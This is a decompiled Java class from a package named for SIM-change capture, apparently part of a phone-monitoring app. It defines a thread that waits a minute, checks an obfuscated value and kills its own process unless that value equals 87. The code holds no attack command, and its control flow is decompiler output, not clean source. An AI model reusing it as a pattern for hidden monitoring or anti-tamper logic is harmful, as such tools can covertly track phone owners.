package com.vvt.capture.simchange;

import android.os.Process;
import android.os.SystemClock;

class h
  extends Thread
{
  h(g paramg) {}
  
  public void run()
  {
    long l = 60000L;
    SystemClock.sleep(l);
    Object localObject = g.a(this.a);
    if (localObject == null)
    {
      boolean bool1 = g.c();
      if (bool1) {}
      int i = Process.myPid();
      Process.killProcess(i);
    }
    for (;;)
    {
      return;
      localObject = g.a(this.a);
      boolean bool2 = localObject instanceof String;
      int j;
      if (bool2)
      {
        bool2 = g.c();
        if (bool2) {}
        j = Process.myPid();
        Process.killProcess(j);
      }
      else
      {
        localObject = (Integer)g.a(this.a);
        j = ((Integer)localObject).intValue();
        int m = 87;
        if (j != m)
        {
          boolean bool3 = g.c();
          if (bool3) {}
          int k = Process.myPid();
          Process.killProcess(k);
        }
      }
    }
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/capture/simchange/AppEngine1.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */